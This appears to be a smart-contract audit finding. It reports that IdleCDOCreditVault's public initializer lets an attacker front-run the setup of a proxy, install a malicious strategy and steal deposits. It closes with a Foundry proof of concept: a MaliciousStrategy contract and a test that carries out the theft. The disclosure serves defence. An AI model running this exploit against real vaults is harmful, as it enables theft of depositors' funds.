### Title
Unpermissioned credit-vault initializer allows proxy initialization front-running and deposit theft - ([File: contracts/IdleCDOCreditVault.sol])

### Summary
`IdleCDOCreditVault.initialize` is publicly callable and grants control over the CDO’s strategy, guardian, recovery address, and ownership to the first caller. If a credit-vault proxy is deployed without initialization calldata, an unprivileged attacker can initialize it with a malicious strategy before the intended operator does. Subsequent deposits are routed to that strategy, which can use the unlimited allowance granted during initialization to steal the deposited underlying tokens.

### Finding Description
The initializer can be invoked by any account while `token == address(0)`; it does not restrict `msg.sender` to a deployer, factory, or predicted owner. During initialization, the caller supplies `_strategy`, `_governanceFund`, and `_owner`, and the contract grants unlimited allowances for both the underlying and strategy token to `_strategy`. [1](#0-0) [2](#0-1) 

The credit-vault factory mitigates this risk for its own deployment path because `TransparentUpgradeableProxy` is constructed with encoded initialization data, making proxy deployment and initialization atomic. [3](#0-2) [4](#0-3) 

That protection does not apply to a proxy deployed directly with empty initialization calldata. Between proxy deployment and the intended initialization transaction, an attacker can front-run `initialize`, set themselves as owner and governance recovery address, and bind the vault to an attacker-controlled `IIdleCDOStrategy`.

After hijack, `depositAA` or `depositBB` transfers the victim’s underlying into the CDO, mints tranche shares, and calls `strategy.deposit(_amount)`. [5](#0-4) [6](#0-5)  Because initialization already approved the malicious strategy, its `deposit` implementation can call `transferFrom(address(cdo), attacker, amount)` and take the full deposit.

### Impact Explanation
The attacker can steal all underlying tokens deposited into the hijacked vault. For a victim deposit of `N` tokens, the attacker’s malicious strategy can extract `N`, while the victim receives newly minted tranche shares backed by no strategy assets.

The same hijack also gives the attacker the vault owner/guardian role and lets them choose `governanceRecoveryFund`. Any ERC-20 balance retained by the CDO can additionally be moved to that recovery address through `transferToken`. [7](#0-6) [8](#0-7) 

This breaks vault solvency and fair minting: tranche shares are issued against deposits that are immediately removed by the strategy.

### Likelihood Explanation
The attack requires a non-atomic deployment: an uninitialized proxy must be visible on-chain before the intended `initialize` transaction. Vaults deployed through `IdleCreditVaultFactory` are not exploitable because deployment and initialization occur in the proxy constructor.

However, the initializer itself does not enforce this deployment pattern. Any manual, scripted, multisig-batched, or alternative proxy deployment that emits an empty `data` argument creates a front-runnable window. The attacker needs only monitor the mempool or newly deployed proxies and pay the initialization transaction’s gas.

### Recommendation
Require every credit-vault proxy to be deployed and initialized atomically through `IdleCreditVaultFactory`, an equivalent factory, or a multicall/proxy-constructor flow that supplies initialization calldata to `TransparentUpgradeableProxy`.

Do not deploy a proxy with empty initialization calldata and initialize it in a later transaction. Deployment procedures should verify immediately after construction that `token`, `strategy`, `owner`, `guardian`, and the governance recovery address match expected values. Where an initializer is intended only for factory use, restrict it to a predetermined factory or use an initialization mechanism that atomically binds the deployer and initialization parameters.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import "../contracts/IdleCDOCreditVault.sol";

contract Underlying is ERC20 {
    constructor() ERC20("Underlying", "UND") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousStrategy {
    using SafeERC20 for IERC20;

    ERC20 public immutable strategyToken;
    address public immutable underlying;
    address public immutable attacker;

    constructor(ERC20 strategyToken_, address underlying_) {
        strategyToken = strategyToken_;
        underlying = underlying_;
        attacker = msg.sender;
    }

    function deposit(uint256 amount) external {
        // IdleCDOCreditVault gave this strategy unlimited underlying allowance
        // during initialize.
        IERC20(underlying).safeTransferFrom(msg.sender, attacker, amount);
    }

    // Remaining IIdleCDOStrategy methods omitted for brevity.
}

contract InitializationFrontRunTest is Test {
    function testAttackerFrontRunsInitializationAndStealsDeposit() external {
        address deployer = makeAddr("deployer");
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address proxyAdmin = makeAddr("proxyAdmin");

        Underlying underlying = new Underlying();
        IdleCDOCreditVault implementation = new IdleCDOCreditVault();

        // Unsafe deployment: proxy and initialization are separate transactions.
        vm.prank(deployer);
        IdleCDOCreditVault cdo = IdleCDOCreditVault(
            address(new TransparentUpgradeableProxy(
                address(implementation),
                proxyAdmin,
                ""
            ))
        );

        MaliciousStrategy strategy = new MaliciousStrategy(
            ERC20(address(underlying)),
            address(underlying)
        );

        // Attacker observes the uninitialized proxy and front-runs initialize.
        vm.prank(attacker);
        cdo.initialize(
            0,
            address(underlying),
            attacker,           // governance recovery fund
            attacker,           // owner/guardian
            address(0),
            address(strategy),
            100_000
        );

        uint256 depositAmount = 1_000e18;
        underlying.mint(victim, depositAmount);

        vm.startPrank(victim);
        underlying.approve(address(cdo), depositAmount);
        cdo.depositAA(depositAmount);
        vm.stopPrank();

        assertEq(underlying.balanceOf(attacker), depositAmount);
        assertEq(underlying.balanceOf(address(cdo)), 0);
    }
}
```
